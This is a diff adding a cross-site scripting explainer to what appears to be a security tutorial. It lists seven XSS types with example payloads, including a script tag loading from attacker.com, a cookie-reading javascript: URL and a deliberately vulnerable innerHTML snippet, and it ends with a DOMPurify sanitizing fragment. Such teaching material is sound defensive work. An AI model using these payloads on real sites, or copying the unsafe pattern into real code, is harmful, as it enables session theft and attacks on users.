@@ -464,7 +464,7 @@ Final output:
 
 ✔ Attacker Mindset
 1. Find input field
-2. Inject <script>
+2. Inject `<script>`
 3. Check response
 4. Improve payload
 5. Exploit users
@@ -479,4 +479,108 @@ Final output:
 
 </details>
 
+---
+---
+
+<details>
+  <summary>👉🏼 TYPE OF XSS:</summary>
+
+#### **1. Stored XSS**
+
+* Payload stored in DB and runs for all users
+  **Example:**
+
+```html
+<script>alert('Stored XSS')</script>
+```
+
+---
+
+#### **2. Reflected XSS**
+
+* Payload reflected via URL or form
+**Example:**
+
+```text
+https://site.com/search?q=<script>alert('Reflected XSS')</script>
+```
+
+---
+
+#### **3. DOM-Based XSS**
+
+* Client-side JS vulnerability
+  **Example:**
+
+```html
+<div id="out"></div>
+<script>
+document.getElementById("out").innerHTML = location.hash;
+</script>
+```
+
+URL:
+
+```text
+#<script>alert('DOM XSS')</script>
+```
+
+---
+
+#### **4. Blind XSS**
+
+* Executes later in admin panel/logs
+  **Example:**
+
+```html
+<script src="https://attacker.com/xss.js"></script>
+```
+
+---
+
+#### **5. Self XSS**
+
+* User tricks themselves
+  **Example:**
+
+```javascript
+javascript:alert(document.cookie)
+```
+
+---
+
+#### **6. Mutation XSS (mXSS)**
+
+* Browser changes sanitized HTML
+  **Example:**
+
+```html
+<svg><p><style><img src=x onerror=alert(1)>
+```
+
+---
+
+#### **7. Universal XSS (UXSS)**
+
+* Browser vulnerability
+  **Example:**
+
+```javascript
+// Exploit depends on browser bug (no fixed payload)
+```
+
+</details>
+
 <img src="https://user-images.githubusercontent.com/73097560/115834477-dbab4500-a447-11eb-908a-139a6edaec5c.gif">
+
+
+
+
+
+const handleChange = (e) => {
+  const dirty = e.target.value;
+  const clean = DOMPurify.sanitize(dirty);
+  setContent(clean);
+};
+
+<textarea onChange={handleChange} />
